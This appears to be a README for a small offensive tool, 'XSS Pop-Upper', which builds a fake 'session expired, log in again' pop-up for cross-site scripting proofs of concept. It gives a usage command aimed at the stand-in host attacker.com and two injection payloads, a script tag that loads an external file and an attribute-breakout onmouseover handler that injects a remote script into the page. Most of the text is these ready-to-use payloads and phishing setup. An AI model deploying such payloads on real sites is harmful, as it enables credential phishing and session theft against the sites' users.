# XSS Pop-Upper
This Javascript file creates a pop-up for your XSS PoC.

# Usage
`python xss-popupper.py --url "http://attacker.com" --title "Log-in for session" --body "Your session has expired. Please log-in again" --time 5000`

# Inject
- For HTML Element: <br/>`<script src=http://export.js></script>`
- For Element Attribute: <br/>`"onmouseover="x=document.createElement('script');x.src='export.js';document.getElementsByTagName('head')[0].appendChild(x)`

<img src=http://g.recordit.co/SicxeWVXzZ.gif />
